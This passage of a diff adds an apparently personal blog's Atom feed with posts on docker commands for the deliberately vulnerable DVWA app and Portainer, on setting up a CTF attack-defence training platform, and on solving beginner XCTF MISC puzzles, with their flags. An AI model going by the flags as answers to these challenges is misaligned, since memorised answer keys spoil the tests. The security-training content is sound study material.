+		if (maxs &lt; chuan[i].valuestr)
+		{
+			maxs = chuan[i].valuestr;
+			maxc = chuan[i].strchar;
+		}
+		if (mins &gt; chuan[i].valuestr)
+		{
+			mins = chuan[i].valuestr;
+			minc = chuan[i].strchar;
+		}
+	}
+	a = (int)(maxs - mins);
+	if (shifouzhishu(a))
+	{
+		printf(&quot;Lucky Word\n&quot;);
+		printf(&quot;%d&quot;, a);
+	}
+	else
+	{
+		printf(&quot;No Answer\n&quot;);
+		printf(&quot;%d&quot;, a);
+	}
+	return 0;
+}
+
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[docker相关]]></title>
+        <id>https://yjn140.site/yknxfJG9P/</id>
+        <link href="https://yjn140.site/yknxfJG9P/">
+        </link>
+        <updated>2021-11-11T14:15:24.000Z</updated>
+        <content type="html"><![CDATA[<p>docker run -d -p 80:80 -p 3306:3306 -e MYSQL_PASS=&quot;mypass&quot; infoslack/dvwa</p>
+<p>docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[搭建CTF-AWD训练平台]]></title>
+        <id>https://yjn140.site/ffa9PMG0D/</id>
+        <link href="https://yjn140.site/ffa9PMG0D/">
+        </link>
+        <updated>2021-11-11T14:00:53.000Z</updated>
+        <content type="html"><![CDATA[<p>git clone https://github.com/zhl2008/awd-platform</p>
+<p>cd awd-platform<br>
+sudo docker pull zhl2008/web_14.04<br>
+sudo docker tag zhl2008/web_14.04 web_14.04<br>
+python batch.py web_yunnan_simple 2<br>
+python start.py ./ 2<br>
+sudo python stop_clean.py<br>
+值得注意的是执行stop_clean.py会把其他正在运行的容器一起删了</p>
+<p>https://blog.csdn.net/huanghelouzi/article/details/90204325</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[攻防世界 ctf入门题解]]></title>
+        <id>https://yjn140.site/iMMEjIY9K/</id>
+        <link href="https://yjn140.site/iMMEjIY9K/">
+        </link>
+        <updated>2021-10-22T16:43:06.000Z</updated>
+        <summary type="html"><![CDATA[<p>为了梳理做题思路,我决定把攻防世界的入门题重新做一遍</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>为了梳理做题思路,我决定把攻防世界的入门题重新做一遍</p>
+<!-- more -->
+<p>MISC<br>
+这个板块主要是在各种文件结构里找到flag,经常使用到各种工具.也可能要自己用算法处理一些数据</p>
+<p>新手练习区</p>
+<p>001<br>
+this_is_flag<br>
+Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}<br>
+flag{th1s_!s_a_d4m0_4la9}<br>
+直接看,熟悉一下提交flag的格式</p>
+<p>002<br>
+pdf<br>
+菜猫给了菜狗一张图，说图下面什么都没有<br>
+https://adworld.xctf.org.cn/media/task/attachments/ad00be3652ac4301a71dedd2708f78b8.pdf</p>
+<p><img src="https://yjn140.site/post-images/1634921391115.png" alt="" loading="lazy"><br>
+对pdf进行编辑,移走图片,就看到flag了<br>
+flag{security_through_obscurity}<br>
+之后做题可以看一下pdf里面的文档信息,flag是不是在外部或者与背景同色.当然也考虑隐写</p>
+<p>003<br>
+如来十三掌<br>
+菜狗为了打败菜猫，学了一套如来十三掌。<br>
+https://adworld.xctf.org.cn/media/task/attachments/833e81c19b2b4726986bd6a606d64f3c.docx<br>
+<img src="https://yjn140.site/post-images/1634921618161.png" alt="" loading="lazy"><br>
+是佛语,有个&quot;与佛论禅&quot;的网站加密数据后可生成禅语https://www.keyfc.net/bbs/tools/tudoucode.aspx<br>
+<img src="https://yjn140.site/post-images/1634921856247.png" alt="" loading="lazy"><br>
+我重新做的时候发现加了佛曰:解不出来,原来是:的问题,要用全角.<img src="https://yjn140.site/post-images/1634922453607.png" alt="" loading="lazy"><br>
+MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9<br>
+结合十三掌,用rot-13解码<br>
+http://www.mxcz.net/tools/rot13.aspx<br>
+ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9<br>
+解base64<br>
+flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p>
+<p>004<br>
+give_you_flag<br>
+菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包<br>
+https://adworld.xctf.org.cn/media/task/attachments/4b0799f9a4d649f09a882b6b1130bb70.gif<br>
+<img src="https://yjn140.site/post-images/1634922908219.gif" alt="" loading="lazy"><br>
+是一个gif图,找个网站把每一帧解出来,然后找到那个二维码图<br>
+https://www.qtool.net/gif<br>
+<img src="https://yjn140.site/post-images/1634922897764.png" alt="" loading="lazy"><br>
+加上定位点就好了<br>
+flag{e7d478cf6b915f50ab1277f78502a2c5}</p>
+<p>005<br>
+stegano<br>
+菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写<br>
+https://adworld.xctf.org.cn/media/task/attachments/d802bcf9530b45e0b37170c67b8efcea.pdf<br>
+pdf上面有一堆东西,发现内容中有一串AAABBB,然后我就会考虑二进制和摩斯电码<br>
+01 AB .-都互相搭配试一下<br>
+要是没发现,甚至还有误导人的<br>
+<img src="https://yjn140.site/post-images/1634923641961.png" alt="" loading="lazy"><br>
+得到CONGRATULATIONSFLAG1NV151BL3M3554G3<br>
+flag{1NV151BL3M3554G3}</p>
+]]></content>
+    </entry>
+</feed>
